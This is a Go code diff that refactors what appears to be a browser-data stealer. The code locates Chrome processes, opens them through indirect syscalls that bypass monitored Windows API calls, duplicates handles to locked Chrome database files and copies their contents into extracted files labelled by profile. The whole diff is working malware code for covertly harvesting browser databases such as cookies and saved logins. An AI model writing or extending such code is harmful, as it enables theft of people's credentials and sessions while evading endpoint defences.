@@ -256,16 +256,59 @@ func Extract() (*ExtractionResult, error) {
 	log.Printf("[+] found %d chrome processes\n", len(chromeProcs))
 
 	var targetPID uint32
-	var foundHandles = make([]struct {
+	maxHandles := 0
+	for pid, handles := range chromeProcs {
+		if len(handles) > maxHandles {
+			maxHandles = len(handles)
+			targetPID = pid
+		}
+	}
+	log.Printf("[*] selected main browser PID: %d\n", targetPID)
+
+	type foundHandle struct {
 		handle uintptr
 		pid    uint32
 		path   string
 		dbType string
-	}, 0)
+		data   []byte
+	}
+	var foundHandles []foundHandle
+	var fileTypeIndex uint32
+
+	var openProcs []uintptr
+	defer func() {
+		for _, p := range openProcs {
+			wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, p)
+		}
+	}()
 
 	log.Println("[*] searching for relevant database handles...")
 	for pid, handles := range chromeProcs {
+		var clientId struct {
+			pid uintptr
+			tid uintptr
+		}
+		clientId.pid = uintptr(pid)
+		var objAttr ObjectAttributes
+		objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+		var proc uintptr
+		if r, _ := wc.IndirectSyscall(
+			openProcess.SSN,
+			openProcess.Address,
+			uintptr(unsafe.Pointer(&proc)),
+			uintptr(dupHandle),
+			uintptr(unsafe.Pointer(&objAttr)),
+			uintptr(unsafe.Pointer(&clientId)),
+		); r != statusSuccess {
+			continue
+		}
+		openProcs = append(openProcs, proc)
+
 		for _, h := range handles {
+			if fileTypeIndex != 0 && h.ObjectTypeIndex != fileTypeIndex {
+				continue
+			}
+
 			type extractResult struct {
 				data []byte
 				path string
@@ -273,16 +316,18 @@ func Extract() (*ExtractionResult, error) {
 			}
 			resultChan := make(chan extractResult, 1)
 
-			go func(handle uintptr, procPID uint32) {
-				data, path, err := ExtractFile(handle, procPID)
+			go func(handle uintptr, p uintptr) {
+				data, path, err := ExtractFile(handle, p)
 				resultChan <- extractResult{data, path, err}
-			}(h.Val, pid)
+			}(h.Val, proc)
 
+			var data []byte
 			var path string
 			var err error
 
 			select {
 			case result := <-resultChan:
+				data = result.data
 				path = result.path
 				err = result.err
 			case <-time.After(100 * time.Millisecond):
@@ -291,6 +336,10 @@ func Extract() (*ExtractionResult, error) {
 
 			if err != nil {
 				continue
+			}
+
+			if fileTypeIndex == 0 {
+				fileTypeIndex = h.ObjectTypeIndex
 			}
 
 			var dbType string
@@ -304,15 +353,13 @@ func Extract() (*ExtractionResult, error) {
 
 			if dbType != "" {
 				log.Printf("[+] found %s handle in PID %d: %s\n", dbType, pid, path)
-				foundHandles = append(foundHandles, struct {
-					handle uintptr
-					pid    uint32
-					path   string
-					dbType string
-				}{h.Val, pid, path, dbType})
-				if targetPID == 0 {
-					targetPID = pid
-				}
+				foundHandles = append(foundHandles, foundHandle{
+					handle: h.Val,
+					pid:    pid,
+					path:   path,
+					dbType: dbType,
+					data:   data,
+				})
 			}
 		}
 	}
@@ -322,34 +369,15 @@ func Extract() (*ExtractionResult, error) {
 		return nil, fmt.Errorf("no chrome process found with required DB handles")
 	}
 
-	var mainBrowserPID uint32
-	maxHandles := 0
-	for pid, handles := range chromeProcs {
-		if len(handles) > maxHandles {
-			maxHandles = len(handles)
-			mainBrowserPID = pid
-		}
-	}
-	targetPID = mainBrowserPID
-	log.Printf("[*] selected main browser PID: %d\n", targetPID)
-
-	log.Println("[*] extracting database files...")
+	log.Println("[*] processing cached database files...")
 	for i, info := range foundHandles {
-		data, _, err := ExtractFile(info.handle, info.pid)
-		if err != nil {
-			log.Printf("[-] Failed to extract file from handle %x in PID %d: %v\n", info.handle, info.pid, err)
-			continue
-		}
-
 		profile := extractProfileName(info.path)
-
 		safeType := strings.ReplaceAll(info.dbType, " ", "_")
 		filename := fmt.Sprintf("chrome_%s_%d_%d.db", safeType, info.pid, i)
-
-		log.Printf("[+] extracted %s (%d bytes) for profile '%s'\n", filename, len(data), profile)
+		log.Printf("[+] extracted %s (%d bytes) for profile '%s'\n", filename, len(info.data), profile)
 		extractedFiles = append(extractedFiles, RawFile{
 			Name:    filename,
-			Data:    data,
+			Data:    info.data,
 			Profile: profile,
 		})
 	}
@@ -605,29 +633,7 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 	return procs, nil
 }
 
-func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
-	var clientId struct {
-		pid uintptr
-		tid uintptr
-	}
-	clientId.pid = uintptr(owner)
-
-	var objAttr ObjectAttributes
-	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
-
-	var proc uintptr
-	if r, _ := wc.IndirectSyscall(
-		openProcess.SSN,
-		openProcess.Address,
-		uintptr(unsafe.Pointer(&proc)),
-		uintptr(dupHandle),
-		uintptr(unsafe.Pointer(&objAttr)),
-		uintptr(unsafe.Pointer(&clientId)),
-	); r != statusSuccess {
-		return nil, "", fmt.Errorf("access denied")
-	}
-	defer wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))
-
+func ExtractFile(hnd uintptr, proc uintptr) ([]byte, string, error) {
 	var dup uintptr
 	self := ^uintptr(0)
 
